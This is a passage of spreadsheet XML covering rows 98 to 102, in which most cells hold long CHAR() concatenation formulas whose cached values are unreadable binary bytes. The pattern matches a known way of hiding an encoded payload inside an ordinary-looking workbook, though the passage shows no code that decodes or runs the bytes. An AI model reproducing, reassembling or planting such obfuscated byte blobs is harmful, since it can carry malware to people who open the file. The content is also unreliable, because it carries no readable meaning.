        <f>CHAR(234)&amp;CHAR(7)&amp;CHAR(17)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(140)&amp;CHAR(69)&amp;CHAR(35)&amp;CHAR(114)&amp;CHAR(138)&amp;CHAR(121)&amp;CHAR(41)&amp;CHAR(50)&amp;CHAR(142)&amp;CHAR(187)&amp;CHAR(38)&amp;CHAR(118)&amp;CHAR(7)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(138)&amp;CHAR(198)&amp;CHAR(10)&amp;CHAR(129)&amp;CHAR(72)&amp;CHAR(33)&amp;CHAR(51)&amp;CHAR(136)&amp;CHAR(130)&amp;CHAR(37)&amp;CHAR(119)&amp;CHAR(3)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(138)&amp;CHAR(73)&amp;CHAR(47)&amp;CHAR(89)&amp;CHAR(189)&amp;CHAR(1)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(142)&amp;CHAR(78)&amp;CHAR(34)&amp;CHAR(61)&amp;CHAR(136)&amp;CHAR(77)&amp;CHAR(35)&amp;CHAR(93)&amp;CHAR(156)&amp;CHAR(70)&amp;CHAR(38)&amp;CHAR(33)&amp;CHAR(90)&amp;CHAR(110)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(18)&amp;CHAR(83)&amp;CHAR(136)&amp;CHAR(142)&amp;CHAR(18)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(84)&amp;CHAR(244)&amp;CHAR(85)&amp;CHAR(120)&amp;CHAR(142)&amp;CHAR(198)&amp;CHAR(8)&amp;CHAR(131)&amp;CHAR(182)&amp;CHAR(15)&amp;CHAR(6)&amp;CHAR(3)&amp;CHAR(57)&amp;CHAR(193)&amp;CHAR(130)&amp;CHAR(123)&amp;CHAR(38)&amp;CHAR(55)&amp;CHAR(1)&amp;CHAR(91)&amp;CHAR(80)&amp;CHAR(10)&amp;CHAR(147)&amp;CHAR(194)&amp;CHAR(84)&amp;CHAR(140)&amp;CHAR(73)&amp;CHAR(34)&amp;CHAR(21)&amp;CHAR(186)&amp;CHAR(6)&amp;CHAR(58)&amp;CHAR(236)&amp;CHAR(129)&amp;CHAR(93)&amp;CHAR(83)&amp;CHAR(9)&amp;CHAR(69)&amp;CHAR(203)&amp;CHAR(253)&amp;CHAR(158)&amp;CHAR(133)&amp;CHAR(3)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(134)&amp;CHAR(205)&amp;CHAR(136)&amp;CHAR(74)&amp;CHAR(38)&amp;CHAR(39)&amp;CHAR(130)&amp;CHAR(195)&amp;CHAR(9)&amp;CHAR(133)&amp;CHAR(132)&amp;CHAR(8)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(40)&amp;CHAR(118)&amp;CHAR(38)&amp;CHAR(25)&amp;CHAR(176)&amp;CHAR(189)&amp;CHAR(8)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(84)&amp;CHAR(83)&amp;CHAR(111)&amp;CHAR(10)&amp;CHAR(84)&amp;CHAR(85)&amp;CHAR(99)&amp;CHAR(85)&amp;CHAR(92)&amp;CHAR(4)&amp;CHAR(71)&amp;CHAR(198)&amp;CHAR(4)&amp;CHAR(177)&amp;CHAR(199)&amp;CHAR(87)&amp;CHAR(143)&amp;CHAR(74)&amp;CHAR(34)&amp;CHAR(127)&amp;CHAR(90)&amp;CHAR(80)&amp;CHAR(254)&amp;CHAR(144)&amp;CHAR(134)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(141)&amp;CHAR(205)&amp;CHAR(142)&amp;CHAR(78)&amp;CHAR(38)&amp;CHAR(37)&amp;CHAR(136)&amp;CHAR(207)&amp;CHAR(6)&amp;CHAR(134)&amp;CHAR(253)&amp;CHAR(8)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(94)&amp;CHAR(83)&amp;CHAR(85)&amp;CHAR(87)&amp;CHAR(69)&amp;CHAR(84)&amp;CHAR(132)&amp;CHAR(129)&amp;CHAR(39)&amp;CHAR(113)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(81)&amp;CHAR(139)&amp;CHAR(133)&amp;CHAR(19)&amp;CHAR(1)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(81)&amp;CHAR(80)&amp;CHAR(246)&amp;CHAR(144)&amp;CHAR(145)&amp;CHAR(17)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(130)&amp;CHAR(226)&amp;CHAR(131)&amp;CHAR(228)&amp;CHAR(13)&amp;CHAR(129)&amp;CHAR(200)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(59)&amp;CHAR(119)&amp;CHAR(45)&amp;CHAR(17)&amp;CHAR(112)&amp;CHAR(43)&amp;CHAR(245)&amp;CHAR(199)&amp;CHAR(11)&amp;CHAR(22)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(118)&amp;CHAR(22)&amp;CHAR(108)&amp;CHAR(7)&amp;CHAR(135)&amp;CHAR(69)&amp;CHAR(37)&amp;CHAR(39)&amp;CHAR(197)&amp;CHAR(71)&amp;CHAR(33)&amp;CHAR(45)&amp;CHAR(134)&amp;CHAR(54)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(82)&amp;CHAR(111)&amp;CHAR(18)&amp;CHAR(83)&amp;CHAR(246)&amp;CHAR(149)&amp;CHAR(142)&amp;CHAR(8)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(93)</f>
        <v>ê_x0007__x0011__x0003_
ŒE#rŠy)2Ž»&amp;v_x0007__x000D__x0006_ŠÆ
H!3ˆ‚%w_x0003_	_x0005_ŠI/Y½_x0001__x0007__x0002__x0003_ŽN"=ˆM#]œF&amp;!Zn	_x0002__x0005__x0012_SˆŽ_x0012__x0006_	_x0005_TôUxŽÆ_x0008_ƒ¶_x000F__x0006__x0003_9Á‚{&amp;7_x0001_[P
“ÂTŒI"_x0015_º_x0006_:ì]S	EËýž…_x0003__x000D__x000B_†ÍˆJ&amp;'‚Ã	…„_x0008__x0007__x0005_(v&amp;_x0019_°½_x0008__x0002__x0005_TSo
TUcU\_x0004_GÆ_x0004_±ÇWJ"ZPþ†_x0003__x0005__x000D_ÍŽN&amp;%ˆÏ_x0006_†ý_x0008__x000C__x0005_^SUWET„'q
_x000D__x0005_Q‹…_x0013__x0001_
_x0006_QPö‘_x0011__x0002__x0002_‚âƒä_x000D_È_x0005__x0005_	;w-_x0011_p+õÇ_x000B__x0016__x0007__x0007_v_x0016_l_x0007_‡E%'ÅG!-†6_x0007__x0002_Ro_x0012_Sö•Ž_x0008__x000C__x0005_]</v>
      </c>
      <c r="C98" t="str">
        <f>CHAR(83)&amp;CHAR(8)&amp;CHAR(46)&amp;CHAR(32)&amp;CHAR(148)&amp;CHAR(206)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(179)&amp;CHAR(128)</f>
        <v>S_x0008_. ”Î&gt;±³€</v>
      </c>
    </row>
    <row r="99" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B99" t="str">
        <f>CHAR(83)&amp;CHAR(80)&amp;CHAR(87)&amp;CHAR(70)&amp;CHAR(253)&amp;CHAR(158)&amp;CHAR(157)&amp;CHAR(3)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(136)&amp;CHAR(197)&amp;CHAR(14)&amp;CHAR(130)&amp;CHAR(136)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(80)&amp;CHAR(140)&amp;CHAR(69)&amp;CHAR(45)&amp;CHAR(19)&amp;CHAR(194)&amp;CHAR(85)&amp;CHAR(38)&amp;CHAR(22)&amp;CHAR(13)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(82)&amp;CHAR(136)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(37)&amp;CHAR(89)&amp;CHAR(106)&amp;CHAR(16)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(36)&amp;CHAR(94)&amp;CHAR(253)&amp;CHAR(147)&amp;CHAR(151)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(135)&amp;CHAR(206)&amp;CHAR(114)&amp;CHAR(100)&amp;CHAR(139)&amp;CHAR(125)&amp;CHAR(37)&amp;CHAR(31)&amp;CHAR(202)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(115)&amp;CHAR(88)&amp;CHAR(81)&amp;CHAR(143)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(25)&amp;CHAR(193)&amp;CHAR(77)&amp;CHAR(38)&amp;CHAR(18)&amp;CHAR(12)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(85)&amp;CHAR(139)&amp;CHAR(158)&amp;CHAR(83)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(80)&amp;CHAR(101)&amp;CHAR(14)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(33)&amp;CHAR(83)&amp;CHAR(139)&amp;CHAR(48)&amp;CHAR(142)&amp;CHAR(121)&amp;CHAR(2)&amp;CHAR(254)&amp;CHAR(150)&amp;CHAR(149)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(135)&amp;CHAR(194)&amp;CHAR(125)&amp;CHAR(57)&amp;CHAR(141)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(70)&amp;CHAR(6)&amp;CHAR(113)&amp;CHAR(41)&amp;CHAR(99)&amp;CHAR(6)&amp;CHAR(107)&amp;CHAR(9)&amp;CHAR(53)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(253)&amp;CHAR(55)&amp;CHAR(93)&amp;CHAR(249)&amp;CHAR(80)&amp;CHAR(59)&amp;CHAR(139)&amp;CHAR(137)&amp;CHAR(78)&amp;CHAR(4)&amp;CHAR(10)&amp;CHAR(1)&amp;CHAR(132)&amp;CHAR(199)&amp;CHAR(118)&amp;CHAR(22)&amp;CHAR(136)&amp;CHAR(65)&amp;CHAR(34)&amp;CHAR(37)&amp;CHAR(142)&amp;CHAR(118)&amp;CHAR(38)&amp;CHAR(37)&amp;CHAR(92)&amp;CHAR(249)&amp;CHAR(58)&amp;CHAR(82)&amp;CHAR(83)&amp;CHAR(247)&amp;CHAR(155)&amp;CHAR(137)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(138)&amp;CHAR(227)&amp;CHAR(87)&amp;CHAR(246)&amp;CHAR(146)&amp;CHAR(147)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(250)&amp;CHAR(117)&amp;CHAR(34)&amp;CHAR(38)&amp;CHAR(252)&amp;CHAR(144)&amp;CHAR(154)&amp;CHAR(6)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(84)&amp;CHAR(248)&amp;CHAR(113)&amp;CHAR(53)&amp;CHAR(38)&amp;CHAR(253)&amp;CHAR(158)&amp;CHAR(154)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(128)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(64)&amp;CHAR(246)&amp;CHAR(181)&amp;CHAR(67)&amp;CHAR(14)&amp;CHAR(5)&amp;CHAR(4)&amp;CHAR(128)&amp;CHAR(157)&amp;CHAR(76)&amp;CHAR(12)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(138)&amp;CHAR(133)&amp;CHAR(62)&amp;CHAR(1)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(82)&amp;CHAR(81)&amp;CHAR(138)&amp;CHAR(133)&amp;CHAR(35)&amp;CHAR(2)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(85)&amp;CHAR(239)&amp;CHAR(12)&amp;CHAR(22)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(249)&amp;CHAR(126)&amp;CHAR(46)&amp;CHAR(139)&amp;CHAR(143)&amp;CHAR(20)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(249)&amp;CHAR(118)&amp;CHAR(59)&amp;CHAR(82)&amp;CHAR(225)&amp;CHAR(210)&amp;CHAR(17)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(142)&amp;CHAR(193)&amp;CHAR(29)&amp;CHAR(61)&amp;CHAR(129)&amp;CHAR(11)&amp;CHAR(30)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(116)&amp;CHAR(13)&amp;CHAR(50)&amp;CHAR(148)&amp;CHAR(9)&amp;CHAR(8)&amp;CHAR(2)&amp;CHAR(2)</f>
        <v>SPWFýž_x0003__x000D__x000B_ˆÅ_x000E_‚ˆ_x0003__x0007_
PŒE-_x0013_ÂU&amp;_x0016__x000D_
_x0006_	RˆF!%Yj_x0010_	_x0005_$^ý“—_x0006__x0007__x0007_‡Îrd‹}%_x001F_Ê_x0003__x0005__x000D_sXQF!_x0019_ÁM&amp;_x0012__x000C__x000C__x0005__x000B_U‹žS_x0005_	_x0005_Pe_x000E__x000D__x0005_!S‹0Žy_x0002_þ–•_x0007__x0005__x0011_‡Â}9
	F_x0006_q)c_x0006_k	5_x0004__x000B_ý7]ùP;‹‰N_x0004_
_x0001_„Çv_x0016_ˆA"%Žv&amp;%\ù:RS÷›‰_x000B__x0005__x0006_ŠãWö’“_x000D__x000B__x000D_úu"&amp;üš_x0006__x0001__x0001_Tøq5&amp;ýžš_x0006_	_x0002_€ôq@öµC_x000E__x0005__x0004_€L_x000C__x0006__x0007_Š…&gt;_x0001__x0003_
RQŠ…#_x0002__x000D__x0006_Uï_x000C__x0016__x0005__x000D_ù~.‹_x0014__x0003__x000B__x0005_ùv;RáÒ_x0011__x000D__x000B_ŽÁ_x001D_=_x000B__x001E_
_x0006_t_x000D_2”	_x0008__x0002__x0002_</v>
      </c>
      <c r="C99" t="str">
        <f>CHAR(170)&amp;CHAR(161)&amp;CHAR(222)&amp;CHAR(231)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(128)&amp;CHAR(162)&amp;CHAR(101)</f>
        <v>ª¡Þç&gt;±Ö€¢e</v>
      </c>
    </row>
    <row r="100" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B100" t="str">
        <f>CHAR(124)&amp;CHAR(14)&amp;CHAR(141)&amp;CHAR(207)&amp;CHAR(233)&amp;CHAR(7)&amp;CHAR(49)&amp;CHAR(197)&amp;CHAR(90)&amp;CHAR(87)&amp;CHAR(89)&amp;CHAR(130)&amp;CHAR(205)&amp;CHAR(93)&amp;CHAR(6)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(199)&amp;CHAR(138)&amp;CHAR(234)&amp;CHAR(219)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(14)&amp;CHAR(85)&amp;CHAR(86)&amp;CHAR(92)&amp;CHAR(138)&amp;CHAR(181)&amp;CHAR(35)&amp;CHAR(242)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(81)&amp;CHAR(142)&amp;CHAR(105)&amp;CHAR(62)&amp;CHAR(137)&amp;CHAR(65)&amp;CHAR(35)&amp;CHAR(126)&amp;CHAR(140)&amp;CHAR(194)&amp;CHAR(9)&amp;CHAR(140)&amp;CHAR(233)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(139)&amp;CHAR(61)&amp;CHAR(35)&amp;CHAR(137)&amp;CHAR(86)&amp;CHAR(29)&amp;CHAR(134)&amp;CHAR(214)&amp;CHAR(4)&amp;CHAR(137)&amp;CHAR(210)&amp;CHAR(1)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(136)&amp;CHAR(64)&amp;CHAR(22)&amp;CHAR(53)&amp;CHAR(211)&amp;CHAR(2)&amp;CHAR(207)&amp;CHAR(142)&amp;CHAR(81)&amp;CHAR(53)&amp;CHAR(18)&amp;CHAR(139)&amp;CHAR(77)&amp;CHAR(46)&amp;CHAR(34)&amp;CHAR(130)&amp;CHAR(69)&amp;CHAR(37)&amp;CHAR(1)&amp;CHAR(195)&amp;CHAR(140)&amp;CHAR(77)&amp;CHAR(38)&amp;CHAR(23)&amp;CHAR(130)&amp;CHAR(66)&amp;CHAR(32)&amp;CHAR(8)&amp;CHAR(196)&amp;CHAR(141)&amp;CHAR(79)&amp;CHAR(34)&amp;CHAR(39)&amp;CHAR(140)&amp;CHAR(69)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(197)&amp;CHAR(128)&amp;CHAR(9)&amp;CHAR(133)&amp;CHAR(206)&amp;CHAR(118)&amp;CHAR(41)&amp;CHAR(142)&amp;CHAR(121)&amp;CHAR(34)&amp;CHAR(21)&amp;CHAR(138)&amp;CHAR(150)&amp;CHAR(38)&amp;CHAR(237)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(41)&amp;CHAR(214)&amp;CHAR(136)&amp;CHAR(197)&amp;CHAR(37)&amp;CHAR(77)&amp;CHAR(141)&amp;CHAR(10)&amp;CHAR(3)&amp;CHAR(83)&amp;CHAR(136)&amp;CHAR(1)&amp;CHAR(129)&amp;CHAR(202)&amp;CHAR(120)&amp;CHAR(249)&amp;CHAR(132)&amp;CHAR(113)&amp;CHAR(37)&amp;CHAR(22)&amp;CHAR(137)&amp;CHAR(183)&amp;CHAR(35)&amp;CHAR(254)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(130)&amp;CHAR(83)&amp;CHAR(33)&amp;CHAR(1)&amp;CHAR(253)&amp;CHAR(182)&amp;CHAR(45)&amp;CHAR(14)&amp;CHAR(4)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(136)&amp;CHAR(134)&amp;CHAR(33)&amp;CHAR(233)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(207)&amp;CHAR(129)&amp;CHAR(16)&amp;CHAR(231)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(248)&amp;CHAR(179)&amp;CHAR(38)&amp;CHAR(10)&amp;CHAR(4)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(81)&amp;CHAR(233)&amp;CHAR(10)&amp;CHAR(16)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(132)&amp;CHAR(66)&amp;CHAR(33)&amp;CHAR(35)&amp;CHAR(129)&amp;CHAR(198)&amp;CHAR(9)&amp;CHAR(134)&amp;CHAR(66)&amp;CHAR(45)&amp;CHAR(22)&amp;CHAR(133)&amp;CHAR(200)&amp;CHAR(240)&amp;CHAR(140)&amp;CHAR(95)&amp;CHAR(33)&amp;CHAR(26)&amp;CHAR(140)&amp;CHAR(23)&amp;CHAR(154)&amp;CHAR(128)&amp;CHAR(65)&amp;CHAR(39)&amp;CHAR(29)&amp;CHAR(244)&amp;CHAR(185)&amp;CHAR(33)&amp;CHAR(5)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(3)&amp;CHAR(140)&amp;CHAR(2)&amp;CHAR(249)&amp;CHAR(181)&amp;CHAR(37)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(17)&amp;CHAR(1)&amp;CHAR(204)&amp;CHAR(88)&amp;CHAR(226)&amp;CHAR(218)&amp;CHAR(24)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(49)&amp;CHAR(65)&amp;CHAR(33)&amp;CHAR(45)&amp;CHAR(129)&amp;CHAR(199)&amp;CHAR(5)&amp;CHAR(54)&amp;CHAR(80)&amp;CHAR(47)&amp;CHAR(30)&amp;CHAR(63)&amp;CHAR(143)&amp;CHAR(34)&amp;CHAR(255)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(14)&amp;CHAR(115)&amp;CHAR(10)&amp;CHAR(49)</f>
        <v>|_x000E_Ïé_x0007_1ÅZWY‚Í]_x0006__x000B__x0002_ÇŠêÛ_x0006__x0002__x000E_UV\Šµ#ò_x0002__x0005__x000D_QŽi&gt;‰A#~ŒÂ	Œé_x0005__x000B__x0005_‹=#‰V_x001D_†Ö_x0004_‰Ò_x0001__x0006__x0002_ˆ@_x0016_5Ó_x0002_ÏŽQ5_x0012_‹M."‚E%_x0001_ÃŒM&amp;_x0017_‚B _x0008_ÄO"'ŒE_x0002__x0005_Å€	…Îv)Žy"_x0015_Š–&amp;í_x000D__x0006_	)ÖˆÅ%M
_x0003_Sˆ_x0001_Êxù„q%_x0016_‰·#þ_x0007__x0001__x0001_‚S!_x0001_ý¶-_x000E__x0004_	_x0002_ˆ†!é	_x0002__x0003_Ï_x0010_ç_x0002__x0004__x000B__x0006_ø³&amp;
_x0004__x0003_
Qé
_x0010__x0003__x0005_„B!#Æ	†B-_x0016_…ÈðŒ_!_x001A_Œ_x0017_š€A'_x001D_ô¹!_x0005__x0004__x0002__x0003_Œ_x0002_ùµ%_x000D__x0005__x0005__x0011__x0001_ÌXâÚ_x0018__x0002__x0005_1A!-Ç_x0005_6P/_x001E_?"ÿ_x0006__x0002__x000E_s
1</v>
      </c>
      <c r="C100" t="str">
        <f>CHAR(131)&amp;CHAR(135)&amp;CHAR(181)&amp;CHAR(177)&amp;CHAR(158)&amp;CHAR(67)&amp;CHAR(33)&amp;CHAR(192)&amp;CHAR(183)&amp;CHAR(68)</f>
        <v>ƒ‡µ±žC!À·D</v>
      </c>
    </row>
    <row r="101" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B101" t="str">
        <f>CHAR(149)&amp;CHAR(37)&amp;CHAR(251)&amp;CHAR(3)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(121)&amp;CHAR(27)&amp;CHAR(142)&amp;CHAR(67)&amp;CHAR(38)&amp;CHAR(18)&amp;CHAR(134)&amp;CHAR(229)&amp;CHAR(2)&amp;CHAR(128)&amp;CHAR(70)&amp;CHAR(34)&amp;CHAR(24)&amp;CHAR(143)&amp;CHAR(238)&amp;CHAR(10)&amp;CHAR(112)&amp;CHAR(189)&amp;CHAR(50)&amp;CHAR(211)&amp;CHAR(93)&amp;CHAR(87)&amp;CHAR(88)&amp;CHAR(88)&amp;CHAR(140)&amp;CHAR(207)&amp;CHAR(209)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(6)&amp;CHAR(193)&amp;CHAR(136)&amp;CHAR(67)&amp;CHAR(46)&amp;CHAR(38)&amp;CHAR(138)&amp;CHAR(77)&amp;CHAR(45)&amp;CHAR(35)&amp;CHAR(10)&amp;CHAR(166)&amp;CHAR(70)&amp;CHAR(90)&amp;CHAR(247)&amp;CHAR(129)&amp;CHAR(10)&amp;CHAR(136)&amp;CHAR(1)&amp;CHAR(203)&amp;CHAR(57)&amp;CHAR(202)&amp;CHAR(119)&amp;CHAR(116)&amp;CHAR(137)&amp;CHAR(71)&amp;CHAR(39)&amp;CHAR(121)&amp;CHAR(7)&amp;CHAR(204)&amp;CHAR(57)&amp;CHAR(204)&amp;CHAR(120)&amp;CHAR(117)&amp;CHAR(52)&amp;CHAR(213)&amp;CHAR(58)&amp;CHAR(31)&amp;CHAR(114)&amp;CHAR(29)&amp;CHAR(135)&amp;CHAR(125)&amp;CHAR(37)&amp;CHAR(47)&amp;CHAR(137)&amp;CHAR(242)&amp;CHAR(46)&amp;CHAR(244)&amp;CHAR(133)&amp;CHAR(255)&amp;CHAR(59)&amp;CHAR(113)&amp;CHAR(19)&amp;CHAR(143)&amp;CHAR(11)&amp;CHAR(142)&amp;CHAR(13)&amp;CHAR(53)&amp;CHAR(134)&amp;CHAR(54)&amp;CHAR(34)&amp;CHAR(113)&amp;CHAR(12)&amp;CHAR(71)&amp;CHAR(64)&amp;CHAR(129)&amp;CHAR(45)&amp;CHAR(2)&amp;CHAR(124)&amp;CHAR(239)&amp;CHAR(196)&amp;CHAR(73)&amp;CHAR(31)&amp;CHAR(36)&amp;CHAR(97)&amp;CHAR(109)&amp;CHAR(106)&amp;CHAR(2)&amp;CHAR(65)&amp;CHAR(4)&amp;CHAR(192)&amp;CHAR(53)&amp;CHAR(211)&amp;CHAR(57)&amp;CHAR(24)&amp;CHAR(115)&amp;CHAR(18)&amp;CHAR(156)&amp;CHAR(118)&amp;CHAR(38)&amp;CHAR(97)&amp;CHAR(33)&amp;CHAR(247)&amp;CHAR(138)&amp;CHAR(248)&amp;CHAR(122)&amp;CHAR(113)&amp;CHAR(9)&amp;CHAR(143)&amp;CHAR(8)&amp;CHAR(64)&amp;CHAR(139)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(69)&amp;CHAR(139)&amp;CHAR(59)&amp;CHAR(4)&amp;CHAR(126)&amp;CHAR(233)&amp;CHAR(140)&amp;CHAR(179)&amp;CHAR(38)&amp;CHAR(254)&amp;CHAR(7)&amp;CHAR(3)&amp;CHAR(10)&amp;CHAR(140)&amp;CHAR(69)&amp;CHAR(35)&amp;CHAR(42)&amp;CHAR(83)&amp;CHAR(195)&amp;CHAR(73)&amp;CHAR(18)&amp;CHAR(105)&amp;CHAR(7)&amp;CHAR(253)&amp;CHAR(84)&amp;CHAR(53)&amp;CHAR(136)&amp;CHAR(198)&amp;CHAR(125)&amp;CHAR(15)&amp;CHAR(139)&amp;CHAR(68)&amp;CHAR(40)&amp;CHAR(109)&amp;CHAR(90)&amp;CHAR(85)&amp;CHAR(249)&amp;CHAR(87)&amp;CHAR(39)&amp;CHAR(137)&amp;CHAR(193)&amp;CHAR(238)&amp;CHAR(1)&amp;CHAR(62)&amp;CHAR(194)&amp;CHAR(134)&amp;CHAR(196)&amp;CHAR(232)&amp;CHAR(93)&amp;CHAR(253)&amp;CHAR(252)&amp;CHAR(248)&amp;CHAR(92)&amp;CHAR(141)&amp;CHAR(117)&amp;CHAR(37)&amp;CHAR(5)&amp;CHAR(80)&amp;CHAR(54)&amp;CHAR(238)&amp;CHAR(137)&amp;CHAR(76)&amp;CHAR(17)&amp;CHAR(143)&amp;CHAR(207)&amp;CHAR(125)&amp;CHAR(11)&amp;CHAR(142)&amp;CHAR(3)&amp;CHAR(84)&amp;CHAR(250)&amp;CHAR(89)&amp;CHAR(10)&amp;CHAR(138)&amp;CHAR(119)&amp;CHAR(29)&amp;CHAR(143)&amp;CHAR(69)&amp;CHAR(30)&amp;CHAR(129)&amp;CHAR(194)&amp;CHAR(114)&amp;CHAR(14)&amp;CHAR(140)&amp;CHAR(3)&amp;CHAR(95)&amp;CHAR(249)&amp;CHAR(83)&amp;CHAR(2)&amp;CHAR(136)&amp;CHAR(127)&amp;CHAR(27)&amp;CHAR(137)&amp;CHAR(77)&amp;CHAR(17)&amp;CHAR(136)&amp;CHAR(207)&amp;CHAR(113)&amp;CHAR(14)&amp;CHAR(137)&amp;CHAR(3)&amp;CHAR(84)&amp;CHAR(242)&amp;CHAR(86)&amp;CHAR(1)&amp;CHAR(139)&amp;CHAR(120)&amp;CHAR(28)&amp;CHAR(135)&amp;CHAR(75)&amp;CHAR(27)&amp;CHAR(128)&amp;CHAR(207)&amp;CHAR(117)&amp;CHAR(26)&amp;CHAR(137)</f>
        <v>•%û_x0003__x0003__x0005_y_x001B_ŽC&amp;_x0012_†å_x0002_€F"_x0018_î
p½2Ó]WXXŒÏÑ_x0004__x0001__x0006_ÁˆC.&amp;ŠM-#
¦FZ÷
ˆ_x0001_Ë9Êwt‰G'y_x0007_Ì9Ìxu4Õ:_x001F_r_x001D_‡}%/‰ò.ô…ÿ;q_x0013__x000B_Ž_x000D_5†6"q_x000C_G@-_x0002_|ïÄI_x001F_$amj_x0002_A_x0004_À5Ó9_x0018_s_x0012_œv&amp;a!÷Šøzq	_x0008_@‹_x000D__x000B_E‹;_x0004_~éŒ³&amp;þ_x0007__x0003_
ŒE#*SÃI_x0012_i_x0007_ýT5ˆÆ}_x000F_‹D(mZUùW'‰Áî_x0001_&gt;Â†Äè]ýüø\u%_x0005_P6î‰L_x0011_Ï}_x000B_Ž_x0003_TúY
Šw_x001D_E_x001E_Âr_x000E_Œ_x0003__ùS_x0002_ˆ_x001B_‰M_x0011_ˆÏq_x000E_‰_x0003_TòV_x0001_‹x_x001C_‡K_x001B_€Ïu_x001A_‰</v>
      </c>
      <c r="C101" t="str">
        <f>CHAR(58)&amp;CHAR(148)&amp;CHAR(254)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(178)&amp;CHAR(78)&amp;CHAR(254)&amp;CHAR(33)</f>
        <v>:”þÈ!¥²Nþ!</v>
      </c>
    </row>
    <row r="102" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B102" t="str">
        <f>CHAR(8)&amp;CHAR(84)&amp;CHAR(252)&amp;CHAR(93)&amp;CHAR(3)&amp;CHAR(132)&amp;CHAR(123)&amp;CHAR(17)&amp;CHAR(141)&amp;CHAR(76)&amp;CHAR(15)&amp;CHAR(130)&amp;CHAR(195)&amp;CHAR(114)&amp;CHAR(8)&amp;CHAR(138)&amp;CHAR(8)&amp;CHAR(86)&amp;CHAR(250)&amp;CHAR(65)&amp;CHAR(10)&amp;CHAR(139)&amp;CHAR(119)&amp;CHAR(6)&amp;CHAR(141)&amp;CHAR(71)&amp;CHAR(10)&amp;CHAR(128)&amp;CHAR(203)&amp;CHAR(113)&amp;CHAR(23)&amp;CHAR(130)&amp;CHAR(3)&amp;CHAR(82)&amp;CHAR(246)&amp;CHAR(85)&amp;CHAR(40)&amp;CHAR(128)&amp;CHAR(68)&amp;CHAR(12)&amp;CHAR(91)&amp;CHAR(141)&amp;CHAR(15)&amp;CHAR(248)&amp;CHAR(83)&amp;CHAR(6)&amp;CHAR(143)&amp;CHAR(125)&amp;CHAR(2)&amp;CHAR(138)